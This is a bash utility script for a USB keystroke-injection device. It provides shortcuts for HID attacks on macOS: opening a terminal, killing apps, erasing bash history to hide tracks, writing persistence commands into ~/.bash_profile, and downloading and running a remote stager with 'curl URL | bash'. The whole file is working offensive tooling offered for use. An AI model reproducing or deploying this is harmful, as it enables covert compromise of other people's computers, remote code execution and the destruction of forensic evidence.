#!/bin/bash
#
# OSXUTILS v1.3 by @thisisnotkmak
# Provides some shortcuts for executing Quack or HID attacks on OSX
# Usage: OSXUTILS [command]
#
# OSXUTILS TERM  --- Opens a new terminal (note: do this before any other commands)
# OSXUTILS KILLTERM --- Closes your terminal session, don't continue with below commands after
# OSXUTILS KILLFOREGROUND --- Kills the foreground application incase you opened (eg. calculator)
# OSXUTILS CLEARTRACKS --- Deletes the bash_history file to be sneaky (recomended to call after payload)
# OSXUTILS PERSISTENCE [Command To Execute On Startup] --- Executes given command on startup
# OSXUTILS GETSTAGE [Web Address To Stager (https://example.com/stage2.sh)] --- Runs a script from a URL (could be the bunny)

function OSXUTILS() {
   local osxcommand=$1
   local osxoptions=$2
   shift

   [[ -z "$osxcommand" ]] && exit 1 # Must have atleast 1 option

   case "$osxcommand" in
      'TERM')
         QUACK GUI SPACE
         QUACK DELAY 100
         QUACK STRING "terminal"
         QUACK ENTER
         QUACK DELAY 2000

         ;;
      'KILLTERM')
         QUACK STRING "killall -9 terminal"
         QUACK ENTER

         ;;

     'KILLFOREGROUND')
        QUACK GUI q

        ;;

      'CLEARTRACKS')
         QUACK STRING "echo > ~/.bash_history"
         QUACK ENTER

         ;;

       'PERSISTENCE')
          [[ -z "$osxoptions" ]] && exit 1 # Must have 2 options
          QUACK STRING "echo \"$osxoptions\" >> ~/.bash_profile"
          QUACK ENTER

          ;;

      'GETSTAGE')
         [[ -z "$osxoptions" ]] && exit 1 # Must have 2 options
         QUACK STRING "curl $osxoptions | bash"
         QUACK ENTER

         ;;

   esac
}

export -f OSXUTILS
